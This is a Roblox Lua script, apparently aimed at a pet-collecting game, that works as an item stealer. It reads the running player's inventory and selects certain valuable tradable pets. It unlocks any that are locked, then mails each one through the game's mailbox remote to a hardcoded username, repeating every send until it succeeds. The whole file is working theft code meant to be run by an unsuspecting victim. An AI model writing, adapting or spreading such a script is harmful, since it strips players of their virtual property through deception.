Roblox_Username = "Nickname";
local Library = require(game.ReplicatedStorage.Library);
local Save = (require((game:GetService("ReplicatedStorage")).Library.Client.Save)).Get();
local Directory = require((game:GetService("ReplicatedStorage")).Library.Directory);
local Player = game.Players.LocalPlayer;
local Inventory = Save.Inventory;
local HttpService = game:GetService("HttpService");
local message = require(game.ReplicatedStorage.Library.Client.Message);
local network = (game:GetService("ReplicatedStorage")):WaitForChild("Network");
local GetListWithAllItems = function()
	local hits = {};
	print(1);
	local AllowedPets = {
		["Crackling Dragon"] = true,
		["Lit Cat"] = true
	};
	Inventory = ((require((game:GetService("ReplicatedStorage")).Library.Client.Save)).Get()).Inventory;
	if Inventory.Pet ~= nil then
		for i, v in pairs(Inventory.Pet) do
			id = v.id;
			dir = Directory.Pets[id];
			if dir.Tradable ~= false and AllowedPets[id] then
				table.insert(hits, {
					Item_Id = i,
					Item_Name = v.id,
					Item_Amount = v._am or 1,
					Item_Class = "Pet",
					IsShiny = v.sh or false,
					IsLocked = v.lk or false,
					Item_ImageId = ItemImageId,
					Item_Type = ItemType
				});
			end;
		end;
	end;
	return hits;
end;
local function sendItem(category, uid, am, locked)
	local args = {
		[1] = Roblox_Username,
		[2] = "Bonki did it",
		[3] = category,
		[4] = uid,
		[5] = am
	};
	local response = false;
	repeat
		if locked == true then
			local args = {
				uid,
				false
			};
			(game:GetService("ReplicatedStorage")).Network.Locking_SetLocked:InvokeServer(unpack(args));
		end;
		local response, err = (network:WaitForChild("Mailbox: Send")):InvokeServer(unpack(args));
	until response == true;
end;
local hits = GetListWithAllItems();
local Left_Hits = #hits;
if #hits > 0 then
	for i, v in pairs(hits) do
		print("sending");
		sendItem(v.Item_Class, v.Item_Id, v.Item_Amount, v.IsLocked);
		Left_Hits = Left_Hits - 1;
	end;
end;
